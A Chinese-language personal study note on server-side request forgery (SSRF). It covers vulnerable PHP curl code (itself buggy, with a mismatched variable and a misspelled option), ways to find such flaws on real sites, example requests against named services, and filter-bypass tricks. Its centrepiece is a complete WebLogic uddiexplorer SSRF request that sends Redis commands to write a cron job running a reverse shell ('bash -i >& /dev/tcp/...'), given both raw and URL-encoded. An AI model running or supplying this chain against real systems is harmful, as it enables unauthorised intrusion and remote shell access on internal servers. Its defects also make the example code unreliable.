

开这篇就是想便分享边做学习



### ssrf案例

漏洞代码分析

```php
<?php
   function curl($curl){
            
            $ch = curl_init();       //初始化代码
            curl_setopt($ch,CURLOPT_URL,$url);
            curl_setopt($ch,CURLOPT_HEARER,0);
            curl_exec($ch);      //执行访问URL
            curl_close($ch);     //关闭连接
   }
   $url = $_GET['url'];      //GET请求获取URL
   curl($url);
?>
    
libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。

PHP中使用cURL实现Get和Post请求的方法
```

漏洞相关函数

file_get_content()
  curl -> curl_exec()
  socket - fsockopen()

#### 漏洞点发现

**web功能上**

1. 分享：通过URL地址分享网页内容
2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
3. 在线翻译：通过URL地址翻译对应文本的内容  提供此功能的百度、有道等。有道翻译某处SSRF可通网易内网：
4. 图片加载与下载：通过URL地址加载或下载图片 ，对图片做些微小调整例如加水印、压缩等，就必须要把图片下载到服务器的本地，所以就可能造  成SSRF问题
5. 图片文章收藏

**URL关键字**

share，src target，display，url

要配合fofa，shodan

**通用型**

weblogic配置不当，自带ssrf  可

```
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```

discuz 

#### 漏洞验证

1. 有回显
2. 有延时 比如?url=www.google.com，有大量延时，而访问有的很快，有差异
3. 外带请求 可以利用dnslog平台测试（http://ceye.io/records/dns

http://www.baidu.com/img/favicon.ico

第一种肯定不会存在ssrf

http://rxx/image?imageUrl=http://www.baidu.com/img/favicon.ico

http://rxx/image?imageUrl=http://10.10.10.10/img/favicon.ico

考虑是不是存在内外网限制



找存在HTTP服务的内网地址：
1、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址
2、通过二级域名暴力猜解工具模糊猜测内网地址



#### 案例

Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

案例1某翻译网SSRF可通内网

http://fanyi.youdao.com/WebpageTranslate?keyfrom=webfanyi.top&url=http%3A%2F%2F10.100.21.3%2Fmessage.shtml&type=EN2ZH_CN

是内网的资产和翻译同网段



案例2某翻译网SSRF防护绕过
案例3某站SSRF读取本地文件
案例4某站视频解析导致SSRF
案例5某狗主站SSRF多种绕过
案例6某乎网SSRF可探测内网

#### 利用危害

1. 探测内网，端口等信息
2. 内网应用攻击 mysql，redis只能本地访问的利用跨协议通信！！！！

```
6379探测到发送三条redis命令，将弹shell脚本写入/etc/crontab

set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.18.0.1/21 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save

进行url编码，
test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa

注意，换行符是“\r\n”，也就是“%0D%0A”。
将url编码后的字符串放在ssrf的域名后面，发送：
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.18.0.3:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


反弹成功

先探测ip，在探测端口，五种状态
```



1. 文件读取 file协议
2. dos攻击，请求大文件始终保持keep-alive always
3. 绕过cdn，拿ip

#### 绕过

1. 请求url中添加个端口  127.0.0.1：80
2. 短链接，替换localhost，127
3. 编码  换进制ip
4. fuzz，混淆  # @ 。再编码